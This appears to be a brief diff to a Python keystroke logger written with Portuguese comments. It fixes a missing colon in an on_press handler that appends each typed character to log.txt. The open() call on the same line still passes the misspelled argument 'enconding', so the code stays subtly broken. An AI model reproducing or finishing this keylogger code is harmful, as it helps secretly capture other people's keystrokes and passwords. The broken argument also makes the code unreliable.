@@ -12,7 +12,7 @@ IGNORAR = {
 }
 
 def on_press(key):
-  try
+  try:
     #Se for uma tecla normal
     with open("log.txt", "a", enconding="utf-8") as f:
       f.write(key.char)
